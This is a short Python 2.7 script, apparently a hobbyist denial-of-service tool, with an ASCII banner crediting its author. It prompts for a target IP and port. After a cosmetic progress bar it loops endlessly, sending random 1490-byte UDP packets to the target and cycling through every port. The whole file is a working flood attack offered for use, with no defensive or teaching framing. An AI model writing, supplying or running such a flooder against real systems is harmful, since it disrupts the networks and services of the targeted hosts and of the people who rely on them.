#!/usr/bin/env python2.7
#
#
#


import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

print
print ("""
.____    ________ _____________________ _______  __________________  ________    _______________ 
|    |   \_____  \\______   \_   _____/ \      \ \____    /\_____  \ \_____  \  /  __  \______  \\n
|    |    /   |   \|       _/|    __)_  /   |   \  /     /  /   |   \  _(__  <  >      <   /    /
|    |___/    |    \    |   \|        \/    |    \/     /_ /    |    \/       \/   --   \ /    / 
|_______ \_______  /____|_  /_______  /\____|__  /_______ \\_______   /______  /\______  //____/  
        \/       \/       \/        \/         \/        \/        \/       \/        \/         """)
print (""" 
                        }--{+} Coded By LORENZO387 {+}--{
           }----{+} https://github.com/LORENZO-387?tab=repositories {+}----{
                        }--{+}     GOOD LUCKKKK    {+}--{  """)
print
ip = raw_input("IP Target : ")
port = input("Port       : ")

print "[                    ] 0% "
time.sleep(0.5)
print "[=====               ] 25%"
time.sleep(0.5)
print "[==========          ] 50%"
time.sleep(0.5)
print "[===============     ] 75%"
time.sleep(0.5)
print "[====================] 100%"
time.sleep(1)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1

